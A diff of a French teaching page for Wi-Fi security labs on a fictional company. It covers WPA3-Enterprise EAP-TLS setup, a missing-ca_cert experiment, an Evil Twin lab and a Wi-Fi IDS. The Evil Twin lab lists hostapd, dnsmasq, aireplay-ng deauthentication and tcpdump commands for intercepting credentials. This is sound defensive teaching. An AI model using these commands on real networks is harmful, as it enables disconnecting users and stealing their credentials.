+sudo pkill -9 wpa_supplicant 2>/dev/null; sleep 1; sudo rm -rf /run/wpa_supplicant/wlan1
+
+# Lancer en foreground (laisser ce terminal ouvert)
+sudo wpa_supplicant -i wlan1 -c /opt/swfe837/configs/wpa_supplicant-eaptls.conf</pre>
+                                        <div class="step-output"><span class="step-output-label">Sortie attendue (extraits clés)</span>wlan1: Trying to associate with 02:00:00:00:00:00 (SSID='SWFE837-WPA3-Enterprise')
+wlan1: Associated with 02:00:00:00:00:00
+EAP: EAP entering state IDENTITY
+EAP-TLS: Start
+SSL: Handshake started
+SSL: Received server certificate
+SSL: Certificate verification succeeded
+wlan1: WPA: Key negotiation completed
+wlan1: CTRL-EVENT-CONNECTED</div>
+                                        <p>Dans le terminal FreeRADIUS (A2), vous devez voir l'authentification complète :</p>
+                                        <div class="step-output"><span class="step-output-label">Log FreeRADIUS pendant la connexion</span>(1) eap_tls: Continuing EAP-TLS ...
+(1) eap_tls: TLS established
+(1) Login correct</div>
+                                    </div>
+                                </li>
+
+                                <li class="step-item">
+                                    <div class="step-num">B3</div>
+                                    <div class="step-body">
+                                        <h6>Vérifier la connexion établie</h6>
+                                        <pre>iw dev wlan1 link
+ip addr show wlan1</pre>
+                                        <div class="step-output"><span class="step-output-label">Sortie attendue</span>Connected to 02:00:00:00:00:00 (on wlan1)
+        SSID: SWFE837-WPA3-Enterprise
+        freq: 2437
+        signal: -30 dBm</div>
+                                    </div>
+                                </li>
+
+                            </ul>
+
+                            <div class="checkpoint-box">
+                                <h6><i class="fas fa-check-circle me-2"></i>Validation Partie B</h6>
+                                <ul>
+                                    <li>wpa_supplicant affiche <code>SSL: Certificate verification succeeded</code> et <code>CTRL-EVENT-CONNECTED</code></li>
+                                    <li>FreeRADIUS affiche <code>TLS established</code> et <code>Login correct</code></li>
+                                    <li><code>iw dev wlan1 link</code> confirme la connexion au SSID</li>
+                                </ul>
+                            </div>
+
+                            <!-- ── Partie C : Expérience sans ca_cert ── -->
+                            <div class="section-sub">Partie C — Expérience : connexion sans vérification du certificat serveur</div>
+                            <div class="theory-box">
+                                <h6><i class="fas fa-flask me-2"></i>Pourquoi cette manipulation ?</h6>
+                                <p>La ligne <code>ca_cert=</code> dans wpa_supplicant est le seul mécanisme qui protège le client contre un Evil Twin en WPA3-Enterprise. Sans elle, le client accepte n'importe quel serveur RADIUS — y compris celui d'un attaquant. Cette manipulation démontre concrètement la faille et son impact.</p>
+                            </div>
+
+                            <ul class="step-list">
+
+                                <li class="step-item">
+                                    <div class="step-num">C1</div>
+                                    <div class="step-body">
+                                        <h6>Terminal 3 — Créer une config sans ca_cert</h6>
+                                        <pre>cp /opt/swfe837/configs/wpa_supplicant-eaptls.conf /tmp/wpa_nocert.conf
+# Commenter la ligne ca_cert (simuler une mauvaise config client)
+sed -i 's|ca_cert=|#ca_cert=|' /tmp/wpa_nocert.conf
+
+# Tuer la connexion en cours
+sudo systemctl stop NetworkManager wpa_supplicant 2>/dev/null
+sudo pkill -9 wpa_supplicant 2>/dev/null; sleep 1; sudo rm -rf /run/wpa_supplicant/wlan1
+
+# Relancer sans vérification du cert serveur (foreground)
+sudo wpa_supplicant -i wlan1 -c /tmp/wpa_nocert.conf</pre>
+                                        <div class="step-output"><span class="step-output-label">Sortie attendue — le client se connecte quand même !</span>SSL: Handshake started
+SSL: No CA certificate configured — skipping server cert verification
+wlan1: CTRL-EVENT-CONNECTED</div>
+                                        <div class="step-warn"><i class="fas fa-exclamation-triangle me-1"></i> <strong>Conclusion à retenir :</strong> sans <code>ca_cert</code>, le client établit une connexion TLS sans vérifier avec qui il parle. Un attaquant avec un faux serveur RADIUS et le même SSID serait accepté sans résistance.</div>
+                                    </div>
+                                </li>
+
+                                <li class="step-item">
+                                    <div class="step-num">C2</div>
+                                    <div class="step-body">
+                                        <h6>Terminal 3 — Rétablir la configuration correcte</h6>
+                                        <pre>sudo systemctl stop NetworkManager wpa_supplicant 2>/dev/null
+sudo pkill -9 wpa_supplicant 2>/dev/null; sleep 1; sudo rm -rf /run/wpa_supplicant/wlan1
+sudo wpa_supplicant -i wlan1 -c /opt/swfe837/configs/wpa_supplicant-eaptls.conf</pre>
+                                    </div>
+                                </li>
+
+                            </ul>
+
+                            <!-- ── Partie D : Evil Twin ── -->
+                            <div class="section-sub">Partie D — Démonstration Evil Twin rejeté</div>
+
+                            <ul class="step-list">
+
+                                <li class="step-item">
+                                    <div class="step-num">D1</div>
+                                    <div class="step-body">
+                                        <h6>Terminal 3 — Lancer un Rogue AP avec le même SSID sur wlan2</h6>
+                                        <p>On démarre un AP ouvert (sans chiffrement) avec le même SSID que l'AP légitime. Le client, correctement configuré avec <code>ca_cert</code>, doit rejeter toute connexion à cet imposteur.</p>
+                                        <pre>sudo hostapd /opt/swfe837/configs/hostapd-evil-twin.conf</pre>
+                                        <div class="step-output"><span class="step-output-label">Sortie attendue</span>wlan2: interface state UNINITIALIZED->ENABLED
+wlan2: AP-ENABLED</div>
+                                    </div>
+                                </li>
+
+                                <li class="step-item">
+                                    <div class="step-num">D2</div>
+                                    <div class="step-body">
+                                        <h6>Vérifier le comportement du client face aux deux AP</h6>
+                                        <p>Le client wlan1 est connecté à l'AP légitime (wlan0). On surveille son log pour confirmer qu'il n'essaie pas de se connecter au Rogue AP :</p>
+                                        <pre># Observer directement dans le Terminal 2 (wpa_supplicant en foreground)</pre>
+                                        <div class="step-output"><span class="step-output-label">Si une tentative vers le Rogue AP est observée</span>SSL: Certificate verification failed
+TLS: Phase2 failure
+EAP: Status=remote certificate rejected
+wlan1: CTRL-EVENT-EAP-FAILURE</div>
+                                        <div class="step-info"><i class="fas fa-info-circle me-1"></i> Ce log confirme que la vérification <code>ca_cert</code> a bloqué la connexion au Rogue AP. <strong>C'est exactement la démonstration attendue.</strong> Sans <code>ca_cert</code> (scénario C1), ce rejet n'aurait pas eu lieu.</div>
+                                    </div>
+                                </li>
+
+                            </ul>
+
+                            <div class="checkpoint-box">
+                                <h6><i class="fas fa-check-circle me-2"></i>Critères de validation complets</h6>
+                                <ul>
+                                    <li>Partie A : <code>radtest</code> retourne <code>Access-Accept</code></li>
+                                    <li>Partie B : connexion EAP-TLS réussie (<code>CTRL-EVENT-CONNECTED</code> + <code>Login correct</code> dans FreeRADIUS)</li>
+                                    <li>Partie C : connexion sans <code>ca_cert</code> réussit — la faille est visible</li>
+                                    <li>Partie D : connexion avec <code>ca_cert</code> valide rejette le Rogue AP (<code>Certificate verification failed</code>)</li>
+                                    <li>Captures d'écran de chaque étape clé prises pour le portfolio</li>
+                                </ul>
+                            </div>
+
+                            <!-- ── Dépannage ── -->
+                            <div class="troubleshoot-box">
+                                <h6><i class="fas fa-wrench me-2"></i>Dépannage</h6>
+                                <div class="tr-item">
+                                    <div class="tr-prob">⚠ FreeRADIUS : "SSL: error:0200100D"</div>
+                                    <div class="tr-sol">Les certificats sont absents ou les chemins dans <code>eap.conf</code> sont incorrects. Vérifiez : <code>ls /opt/swfe837/certs/</code>. Si vide, relancez <code>sudo bash scripts/install_labo.sh</code>.</div>
+                                </div>
+                                <div class="tr-item">
+                                    <div class="tr-prob">⚠ radtest retourne Access-Reject</div>
+                                    <div class="tr-sol">Le compte n'existe pas dans le fichier users, ou le secret partagé est différent. Vérifiez : <code>grep etudiant1 /etc/freeradius/3.0/users</code> et que le secret dans <code>clients.conf</code> est bien <code>labo_secret_2026</code>.</div>
+                                </div>
+                                <div class="tr-item">
+                                    <div class="tr-prob">⚠ wpa_supplicant : "CTRL-EVENT-EAP-FAILURE" sur l'AP légitime</div>
+                                    <div class="tr-sol">Le certificat client est refusé par FreeRADIUS. Vérifiez que <code>client.pem</code> a bien été signé par la même CA que <code>ca.pem</code> : <code>openssl verify -CAfile /opt/swfe837/certs/ca.pem /opt/swfe837/certs/client.pem</code> doit retourner <code>OK</code>.</div>
+                                </div>
+                                <div class="tr-item">
+                                    <div class="tr-prob">⚠ hostapd : "nl80211: Failed to set interface wlan0 into AP mode"</div>
+                                    <div class="tr-sol">L'interface wlan0 est encore en mode monitor depuis le TP1. Relancez : <code>sudo bash scripts/reset_labo.sh</code> puis relancez hostapd.</div>
+                                </div>
+                                <div class="tr-item">
+                                    <div class="tr-prob">⚠ FreeRADIUS déjà en cours d'exécution</div>
+                                    <div class="tr-sol"><code>sudo pkill freeradius</code> puis relancer avec <code>sudo freeradius -X</code>. Vérifiez aussi qu'aucun autre service ne tourne sur le port 1812 : <code>sudo ss -ulnp | grep 1812</code>.</div>
+                                </div>
+                            </div>
+
+                            <!-- ── Questions ── -->
+                            <div class="analysis-box">
+                                <h6><i class="fas fa-question-circle"></i> Questions d'analyse</h6>
+                                <ol>
+                                    <li>Pourquoi un Evil Twin classique échoue-t-il face à WPA3-Enterprise avec EAP-TLS, alors qu'il réussirait face à WPA3-SAE ?</li>
+                                    <li>Quel composant logiciel côté client effectue la vérification du certificat serveur, et quelle ligne de configuration en est responsable ?</li>
+                                    <li>Expliquez ce que vous avez observé à la Partie C : pourquoi le client accepte-t-il quand même une connexion sans <code>ca_cert</code> ?</li>
+                                    <li>Proposez une procédure pour déployer les certificats clients sur les 200 postes de Nexellia en minimisant les interventions manuelles.</li>
+                                </ol>
+                            </div>
+
+                            <!-- ── Livrables ── -->
+                            <div class="deliverable-box">
+                                <h6><i class="fas fa-box-archive me-1"></i> Livrables pour le portfolio</h6>
+                                <ul>
+                                    <li>Log FreeRADIUS (<code>-X</code>) montrant <code>TLS established</code> et <code>Login correct</code></li>
+                                    <li>Log wpa_supplicant montrant <code>Certificate verification succeeded</code> puis <code>CTRL-EVENT-CONNECTED</code></li>
+                                    <li>Capture de la Partie C : connexion sans <code>ca_cert</code> réussie (illustrer la faille)</li>
+                                    <li>Capture de la Partie D : <code>Certificate verification failed</code> sur le Rogue AP</li>
+                                    <li>Analyse écrite ≥ 300 mots : plan de migration WPA2 → WPA3-Enterprise pour Nexellia (contraintes, phasage, coût estimé)</li>
+                                </ul>
+                            </div>
+
+                        </div>
+                    </div>
+                </div>
+                            <h6>Architecture</h6>
+                            <div class="diagram">
+                                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 350" width="800" height="350">
+                                    <defs>
+                                        <filter id="shadow2" x="-2%" y="-2%" width="104%" height="104%">
+                                            <feDropShadow dx="2" dy="2" stdDeviation="2" flood-opacity="0.15"/>
+                                        </filter>
+                                    </defs>
+                                    <rect width="800" height="350" fill="#ffffff" rx="10" />
+                                    <text x="400" y="30" text-anchor="middle" font-family="Arial" font-size="16" font-weight="bold" fill="#1e3c72">TP2 – WPA3-Enterprise (EAP-TLS)</text>
+                                    <!-- Zone légitime -->
+                                    <rect x="30" y="60" width="460" height="250" fill="#e8f5e9" stroke="#2e7d32" stroke-dasharray="8,4" rx="10" />
+                                    <text x="260" y="85" text-anchor="middle" font-family="Arial" font-size="13" font-weight="bold" fill="#2e7d32">Infrastructure légitime</text>
+                                    <!-- Client avec certificat -->
+                                    <rect x="50" y="110" width="110" height="60" fill="#e3f2fd" stroke="#1a3e72" stroke-width="2" rx="6" filter="url(#shadow2)"/>
+                                    <text x="105" y="130" text-anchor="middle" font-family="Arial" font-size="12" font-weight="bold" fill="#0d47a1">Client</text>
+                                    <text x="105" y="147" text-anchor="middle" font-family="Arial" font-size="9" fill="#333">Certificat client</text>
+                                    <text x="105" y="161" text-anchor="middle" font-family="Arial" font-size="9" fill="#333">wlan0</text>
+                                    <!-- AP WPA3-Enterprise -->
+                                    <rect x="220" y="110" width="130" height="60" fill="#fff8e0" stroke="#cc9900" stroke-width="2" rx="6" filter="url(#shadow2)"/>
+                                    <text x="285" y="130" text-anchor="middle" font-family="Arial" font-size="12" font-weight="bold" fill="#b37700">AP WPA3-Ent.</text>
+                                    <text x="285" y="147" text-anchor="middle" font-family="Arial" font-size="9" fill="#333">EAP-TLS</text>
+                                    <text x="285" y="161" text-anchor="middle" font-family="Arial" font-size="9" fill="#333">Canal 6</text>
+                                    <!-- Serveur RADIUS -->
+                                    <rect x="400" y="110" width="80" height="60" fill="#e3f2fd" stroke="#1a3e72" stroke-width="2" rx="6" filter="url(#shadow2)"/>
+                                    <text x="440" y="135" text-anchor="middle" font-family="Arial" font-size="12" font-weight="bold" fill="#0d47a1">RADIUS</text>
+                                    <text x="440" y="152" text-anchor="middle" font-family="Arial" font-size="9" fill="#333">FreeRADIUS</text>
+                                    <!-- Flèches légitimes -->
+                                    <line x1="160" y1="140" x2="220" y2="140" stroke="#1a3e72" stroke-width="2" marker-end="url(#arrowBlue2)"/>
+                                    <text x="190" y="135" text-anchor="middle" font-family="Arial" font-size="9" fill="#1a3e72">1) Assoc.</text>
+                                    <line x1="350" y1="140" x2="400" y2="140" stroke="#1a3e72" stroke-width="2" marker-end="url(#arrowBlue2)"/>
+                                    <text x="375" y="135" text-anchor="middle" font-family="Arial" font-size="9" fill="#1a3e72">2) Auth.</text>
+                                    <!-- Zone attaquant -->
+                                    <rect x="520" y="60" width="250" height="250" fill="#ffebee" stroke="#c62828" stroke-dasharray="8,4" rx="10" />
+                                    <text x="645" y="85" text-anchor="middle" font-family="Arial" font-size="13" font-weight="bold" fill="#c62828">Attaquant</text>
+                                    <!-- Attaquant Evil Twin -->
+                                    <rect x="540" y="110" width="120" height="60" fill="#ffe0e0" stroke="#cc0000" stroke-width="2" rx="6" filter="url(#shadow2)"/>
+                                    <text x="600" y="130" text-anchor="middle" font-family="Arial" font-size="12" font-weight="bold" fill="#b71c1c">Evil Twin</text>
+                                    <text x="600" y="147" text-anchor="middle" font-family="Arial" font-size="9" fill="#333">Même SSID</text>
+                                    <text x="600" y="161" text-anchor="middle" font-family="Arial" font-size="9" fill="#333">Pas de cert.</text>
+                                    <!-- Flèche échec -->
+                                    <line x1="600" y1="170" x2="600" y2="200" stroke="#cc0000" stroke-width="2" marker-end="url(#arrowRed2)"/>
+                                    <text x="620" y="190" font-family="Arial" font-size="9" fill="#cc0000">Échec</text>
+                                    <!-- Succès -->
+                                    <rect x="250" y="240" width="160" height="40" fill="#c8e6c9" stroke="#2e7d32" stroke-width="2" rx="20" />
+                                    <text x="330" y="265" text-anchor="middle" font-family="Arial" font-size="11" font-weight="bold" fill="#1b5e20">✓ Authentifié</text>
+                                    <line x1="440" y1="170" x2="370" y2="240" stroke="#2e7d32" stroke-width="2" marker-end="url(#arrowGreen2)"/>
+                                    <defs>
+                                        <marker id="arrowBlue2" viewBox="0 0 10 10" refX="10" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0,0 L10,5 L0,10 Z" fill="#1a3e72"/></marker>
+                                        <marker id="arrowRed2" viewBox="0 0 10 10" refX="10" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0,0 L10,5 L0,10 Z" fill="#cc0000"/></marker>
+                                        <marker id="arrowGreen2" viewBox="0 0 10 10" refX="10" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0,0 L10,5 L0,10 Z" fill="#2e7d32"/></marker>
+                                    </defs>
+                                </svg>
+                            </div>
+                            <h6>Fichiers de configuration fournis</h6>
+                            <pre>hostapd-wpa3-enterprise.conf
+freeradius/clients.conf
+freeradius/eap.conf
+freeradius/users
+
+# Démarrer FreeRADIUS (mode debug)
+sudo freeradius -X
+
+# Tester la connexion RADIUS
+radtest etudiant1 labo2026 127.0.0.1 0 labo_secret_2026
+
+# Démarrer l'AP WPA3-Enterprise
+sudo hostapd /opt/swfe837/configs/hostapd-wpa3-enterprise.conf</pre>
+                            <div class="alert alert-warning small mt-3">
+                                <i class="fas fa-triangle-exclamation"></i> <strong>Point clé :</strong> la vérification du certificat serveur doit être explicitement activée côté client (<code>ca_cert=</code> dans wpa_supplicant.conf). Sans cette ligne, un client se connecte à n'importe quel AP sans vérifier l'identité du RADIUS.
+                            </div>
+                            <div class="analysis-box">
+                                <h6><i class="fas fa-question-circle"></i> Questions d'analyse</h6>
+                                <ol>
+                                    <li>Pourquoi un Evil Twin classique échoue-t-il face à WPA3-Enterprise ?</li>
+                                    <li>Quel composant vérifie le certificat du serveur et comment ?</li>
+                                    <li>Quel est l'avantage des certificats par rapport à un secret partagé (PSK) ?</li>
+                                    <li>Proposez une méthode pour déployer les certificats sur les 200 postes de Nexellia.</li>
+                                </ol>
+                            </div>
+                            <div class="deliverable-box">
+                                <h6><i class="fas fa-box-archive me-1"></i> Livrables pour le portfolio</h6>
+                                <ul>
+                                    <li>Log FreeRADIUS montrant une authentification EAP-TLS réussie</li>
+                                    <li>Tentative d'Evil Twin rejetée (log client ou Wireshark)</li>
+                                    <li>Plan de migration WPA2→WPA3-Enterprise pour Nexellia (contraintes, phasage)</li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- ══ TP3 ══ -->
+                <div class="accordion-item">
+                    <h2 class="accordion-header" id="heading3">
+                        <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapse3" aria-expanded="false" aria-controls="collapse3">
+                            <i class="fas fa-user-secret me-2"></i> TP3 – Attaque Evil Twin &amp; durcissement (3h)
+                        </button>
+                    </h2>
+                    <div id="collapse3" class="accordion-collapse collapse" aria-labelledby="heading3" data-bs-parent="#mainAccordion">
+                        <div class="accordion-body">
+
+                            <div class="mission-card">
+                                <div class="mission-label"><i class="fas fa-user-secret me-1"></i> Mission 3 · Comprendre l'attaque initiale</div>
+                                <p>Le rapport d'audit révèle que Nexellia a subi une attaque <strong>Evil Twin</strong> il y a 3 semaines. Des identifiants de portail captif ont été interceptés. Votre mission : <strong>reproduire intégralement cette attaque</strong> en laboratoire pour en comprendre la mécanique, puis appliquer les contre-mesures.</p>
+                            </div>
+
+                            <h5>Objectifs</h5>
+                            <ul>
+                                <li>Créer un AP malveillant avec le même SSID (sans chiffrement)</li>
+                                <li>Désauthentifier le client légitime pour provoquer la connexion au Rogue AP</li>
+                                <li>Intercepter des identifiants avec <code>tcpdump</code></li>
+                                <li>Appliquer des contre-mesures : 802.11w, VPN obligatoire</li>
+                            </ul>
+                            <h6>Architecture</h6>
+                            <div class="diagram">
+                                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 400" width="800" height="400">
+                                    <defs>
+                                        <filter id="shadow3" x="-2%" y="-2%" width="104%" height="104%">
+                                            <feDropShadow dx="2" dy="2" stdDeviation="2" flood-opacity="0.15"/>
+                                        </filter>
+                                    </defs>
+                                    <rect width="800" height="400" fill="#ffffff" rx="10" />
+                                    <text x="400" y="30" text-anchor="middle" font-family="Arial" font-size="16" font-weight="bold" fill="#1e3c72">TP3 – Attaque Evil Twin</text>
+                                    <!-- Partie supérieure : connexion légitime -->
+                                    <rect x="30" y="60" width="350" height="120" fill="#e8f5e9" stroke="#2e7d32" stroke-dasharray="8,4" rx="10" />
+                                    <text x="205" y="85" text-anchor="middle" font-family="Arial" font-size="13" font-weight="bold" fill="#2e7d32">Situation initiale</text>
+                                    <rect x="50" y="100" width="80" height="50" fill="#e3f2fd" stroke="#1a3e72" stroke-width="2" rx="6" filter="url(#shadow3)"/>
+                                    <text x="90" y="130" text-anchor="middle" font-family="Arial" font-size="11" font-weight="bold" fill="#0d47a1">Client</text>
+                                    <rect x="230" y="100" width="100" height="50" fill="#fff8e0" stroke="#cc9900" stroke-width="2" rx="6" filter="url(#shadow3)"/>
+                                    <text x="280" y="122" text-anchor="middle" font-family="Arial" font-size="11" font-weight="bold" fill="#b37700">AP légitime</text>
+                                    <text x="280" y="140" text-anchor="middle" font-family="Arial" font-size="9" fill="#333">SSID: NexelliaWifi</text>
+                                    <line x1="130" y1="125" x2="230" y2="125" stroke="#1a3e72" stroke-width="2" marker-end="url(#arrowBlue3)"/>
+                                    <text x="180" y="120" text-anchor="middle" font-family="Arial" font-size="9" fill="#1a3e72">connecté</text>
+                                    <!-- Zone attaque -->
+                                    <rect x="30" y="200" width="740" height="100" fill="#ffebee" stroke="#c62828" stroke-dasharray="8,4" rx="10" />
+                                    <text x="400" y="225" text-anchor="middle" font-family="Arial" font-size="13" font-weight="bold" fill="#c62828">Phase d'attaque</text>
+                                    <rect x="400" y="240" width="110" height="50" fill="#ffe0e0" stroke="#cc0000" stroke-width="2" rx="6" filter="url(#shadow3)"/>
+                                    <text x="455" y="262" text-anchor="middle" font-family="Arial" font-size="11" font-weight="bold" fill="#b71c1c">Attaquant</text>
+                                    <text x="455" y="280" text-anchor="middle" font-family="Arial" font-size="9" fill="#333">Rogue AP</text>
+                                    <line x1="280" y1="150" x2="280" y2="240" stroke="#cc0000" stroke-width="2" marker-end="url(#arrowRed3)" stroke-dasharray="5,3"/>
+                                    <text x="260" y="195" text-anchor="middle" font-family="Arial" font-size="9" fill="#cc0000">3) Désauth</text>
+                                    <rect x="50" y="240" width="80" height="50" fill="#e3f2fd" stroke="#1a3e72" stroke-width="2" rx="6" filter="url(#shadow3)"/>
+                                    <text x="90" y="270" text-anchor="middle" font-family="Arial" font-size="11" font-weight="bold" fill="#0d47a1">Client</text>
+                                    <line x1="130" y1="265" x2="400" y2="265" stroke="#cc0000" stroke-width="2" marker-end="url(#arrowRed3)"/>
+                                    <text x="265" y="258" text-anchor="middle" font-family="Arial" font-size="9" fill="#cc0000">4) Connexion au Rogue AP</text>
+                                    <rect x="580" y="240" width="140" height="50" fill="#fff8e0" stroke="#cc9900" stroke-width="2" rx="6" filter="url(#shadow3)"/>
+                                    <text x="650" y="262" text-anchor="middle" font-family="Arial" font-size="11" font-weight="bold" fill="#b37700">Capture</text>
+                                    <text x="650" y="280" text-anchor="middle" font-family="Arial" font-size="9" fill="#333">tcpdump / identifiants</text>
+                                    <line x1="510" y1="265" x2="580" y2="265" stroke="#cc9900" stroke-width="2" marker-end="url(#arrowOrange3)"/>
+                                    <text x="545" y="258" text-anchor="middle" font-family="Arial" font-size="9" fill="#cc9900">5) Intercepte</text>
+                                    <defs>
+                                        <marker id="arrowBlue3" viewBox="0 0 10 10" refX="10" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0,0 L10,5 L0,10 Z" fill="#1a3e72"/></marker>
+                                        <marker id="arrowRed3" viewBox="0 0 10 10" refX="10" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0,0 L10,5 L0,10 Z" fill="#cc0000"/></marker>
+                                        <marker id="arrowOrange3" viewBox="0 0 10 10" refX="10" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0,0 L10,5 L0,10 Z" fill="#cc9900"/></marker>
+                                    </defs>
+                                </svg>
+                            </div>
+                            <h6>Commandes clés</h6>
+                            <pre>sudo ip link set wlan2 up
+sudo ip addr add 192.168.99.1/24 dev wlan2
+sudo hostapd /opt/swfe837/configs/hostapd-evil-twin.conf &amp;
+sudo dnsmasq -C /opt/swfe837/configs/dnsmasq-evil-twin.conf
+sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
+sudo aireplay-ng -0 10 -a [BSSID_legitime] wlan0mon
+sudo tcpdump -i wlan2 -w capture.pcap</pre>
+                            <div class="analysis-box">
+                                <h6><i class="fas fa-question-circle"></i> Questions d'analyse</h6>
+                                <ol>
+                                    <li>Pourquoi un client se connecte-t-il automatiquement à un Evil Twin ?</li>
+                                    <li>Le filtrage MAC est-il une protection suffisante ? Justifiez.</li>
+                                    <li>Qu'apporte le 802.11w (PMF) dans ce scénario ?</li>
+                                    <li>Comment sensibiliser les 200 collaborateurs de Nexellia à cette menace ? Proposez 3 actions concrètes.</li>
+                                </ol>
+                            </div>
+                            <div class="deliverable-box">
+                                <h6><i class="fas fa-box-archive me-1"></i> Livrables pour le portfolio</h6>
+                                <ul>
+                                    <li>Capture Wireshark montrant des identifiants HTTP interceptés</li>
+                                    <li>Capture de la contre-mesure 802.11w (désauth bloquée)</li>
+                                    <li>Document de recommandations : politique Wi-Fi Nexellia</li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- ══ TP4 ══ -->
+                <div class="accordion-item">
+                    <h2 class="accordion-header" id="heading4">
+                        <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapse4" aria-expanded="false" aria-controls="collapse4">
+                            <i class="fas fa-radar me-2"></i> TP4 – Surveillance &amp; détection d'intrusion Wi‑Fi (2h)
+                        </button>
+                    </h2>
+                    <div id="collapse4" class="accordion-collapse collapse" aria-labelledby="heading4" data-bs-parent="#mainAccordion">
+                        <div class="accordion-body">
+
+                            <div class="mission-card">
+                                <div class="mission-label"><i class="fas fa-eye me-1"></i> Mission 4 · Ne plus jamais rater une attaque</div>
+                                <p>L'attaque contre Nexellia a duré <strong>3 semaines avant d'être détectée</strong>, uniquement grâce à un audit externe. Votre mission : déployer un IDS Wi-Fi qui détecte en temps réel les attaques des TP1 et TP3, et génère des alertes exploitables par l'équipe interne.</p>
+                            </div>
+
+                            <h5>Objectifs</h5>
+                            <ul>
+                                <li>Exécuter le script Python IDS (<code>ids_wifi.py</code>) pour détecter les trames de désauthentification et les Evil Twins</li>
+                                <li>Lancer une attaque de désauth (TP1) et observer les alertes en temps réel</li>
+                                <li>Lancer un Evil Twin (TP3) et observer la détection</li>
+                                <li>Analyser les paquets avec Wireshark en parallèle</li>
+                            </ul>
+                            <h6>Architecture</h6>
+                            <div class="diagram">
+                                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 300" width="800" height="300">
+                                    <defs>
+                                        <filter id="shadow4" x="-2%" y="-2%" width="104%" height="104%">
+                                            <feDropShadow dx="2" dy="2" stdDeviation="2" flood-opacity="0.15"/>
+                                        </filter>
+                                    </defs>
+                                    <rect width="800" height="300" fill="#ffffff" rx="10" />
+                                    <text x="400" y="30" text-anchor="middle" font-family="Arial" font-size="16" font-weight="bold" fill="#1e3c72">TP4 – Détection d'intrusion Wi‑Fi (IDS)</text>
+                                    <!-- Surveillance -->
+                                    <rect x="30" y="60" width="250" height="200" fill="#e8f5e9" stroke="#2e7d32" stroke-dasharray="8,4" rx="10" />
+                                    <text x="155" y="85" text-anchor="middle" font-family="Arial" font-size="13" font-weight="bold" fill="#2e7d32">Sonde IDS</text>
+                                    <rect x="60" y="110" width="100" height="50" fill="#e3f2fd" stroke="#1a3e72" stroke-width="2" rx="6" filter="url(#shadow4)"/>
+                                    <text x="110" y="132" text-anchor="middle" font-family="Arial" font-size="11" font-weight="bold" fill="#0d47a1">IDS (Scapy)</text>
+                                    <text x="110" y="148" text-anchor="middle" font-family="Arial" font-size="9" fill="#333">wlan3mon</text>
+                                    <!-- Zone Wi‑Fi surveillée -->
+                                    <rect x="320" y="60" width="200" height="200" fill="#fff8e0" stroke="#cc9900" stroke-dasharray="8,4" rx="10" />
+                                    <text x="420" y="85" text-anchor="middle" font-family="Arial" font-size="13" font-weight="bold" fill="#b37700">Trafic Wi‑Fi</text>
+                                    <rect x="350" y="110" width="80" height="40" fill="#fff8e0" stroke="#cc9900" stroke-width="2" rx="6" filter="url(#shadow4)"/>
+                                    <text x="390" y="132" text-anchor="middle" font-family="Arial" font-size="10" font-weight="bold" fill="#b37700">AP</text>
+                                    <!-- Attaquant -->
+                                    <rect x="560" y="60" width="200" height="200" fill="#ffebee" stroke="#c62828" stroke-dasharray="8,4" rx="10" />
+                                    <text x="660" y="85" text-anchor="middle" font-family="Arial" font-size="13" font-weight="bold" fill="#c62828">Attaquant</text>
+                                    <rect x="590" y="110" width="100" height="40" fill="#ffe0e0" stroke="#cc0000" stroke-width="2" rx="6" filter="url(#shadow4)"/>
+                                    <text x="640" y="132" text-anchor="middle" font-family="Arial" font-size="10" font-weight="bold" fill="#b71c1c">Attaquant</text>
+                                    <!-- Envoi désauth -->
+                                    <line x1="590" y1="130" x2="470" y2="130" stroke="#cc0000" stroke-width="2" marker-end="url(#arrowRed4)"/>
+                                    <text x="530" y="125" text-anchor="middle" font-family="Arial" font-size="9" fill="#cc0000">désauth</text>
+                                    <!-- Écoute IDS -->
+                                    <line x1="160" y1="130" x2="350" y2="130" stroke="#1a3e72" stroke-width="2" marker-end="url(#arrowBlue4)" stroke-dasharray="5,3"/>
+                                    <text x="255" y="125" text-anchor="middle" font-family="Arial" font-size="9" fill="#1a3e72">écoute</text>
+                                    <!-- Alerte -->
+                                    <rect x="60" y="200" width="150" height="40" fill="#c8e6c9" stroke="#2e7d32" stroke-width="2" rx="20" filter="url(#shadow4)"/>
+                                    <text x="135" y="225" text-anchor="middle" font-family="Arial" font-size="11" font-weight="bold" fill="#1b5e20">[ALERTE] détectée</text>
+                                    <line x1="110" y1="160" x2="110" y2="200" stroke="#2e7d32" stroke-width="2" marker-end="url(#arrowGreen4)"/>
+                                    <defs>
+                                        <marker id="arrowBlue4" viewBox="0 0 10 10" refX="10" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0,0 L10,5 L0,10 Z" fill="#1a3e72"/></marker>
+                                        <marker id="arrowRed4" viewBox="0 0 10 10" refX="10" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0,0 L10,5 L0,10 Z" fill="#cc0000"/></marker>
+                                        <marker id="arrowGreen4" viewBox="0 0 10 10" refX="10" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0,0 L10,5 L0,10 Z" fill="#2e7d32"/></marker>
+                                    </defs>
+                                </svg>
+                            </div>
+                            <h6>Lancement de l'IDS</h6>
+                            <pre># Démarrer l'IDS (terminal dédié)
+sudo python3 ids_wifi.py -i wlan3mon -v
+
+# Terminal 2 : reproduire le deauth flood
+sudo aireplay-ng -0 20 -a [BSSID_AP] wlan0mon
+# → [ALERTE] DEAUTH FLOOD : XX:XX → YY:YY (5 en 10s)
+
+# Terminal 3 : lancer l'Evil Twin
+sudo hostapd /opt/swfe837/configs/hostapd-evil-twin.conf
